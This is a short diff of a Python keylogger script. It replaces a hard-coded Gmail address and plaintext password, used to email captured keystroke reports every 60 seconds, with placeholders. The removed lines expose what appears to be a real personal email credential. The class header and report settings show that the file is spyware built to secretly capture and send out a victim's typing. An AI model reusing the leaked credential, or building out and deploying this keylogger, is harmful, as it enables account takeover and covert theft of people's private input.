@@ -7,8 +7,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 60
-EMAIL_ADDRESS = "muhammadfizry47@gmail.com"
-EMAIL_PASSWORD = "Sing@p0re@566"
+EMAIL_ADDRESS = "<insert email address>"
+EMAIL_PASSWORD = "<insert password>"
 
 class keylogger:
     def __init__(self, interval, report_method="email"):
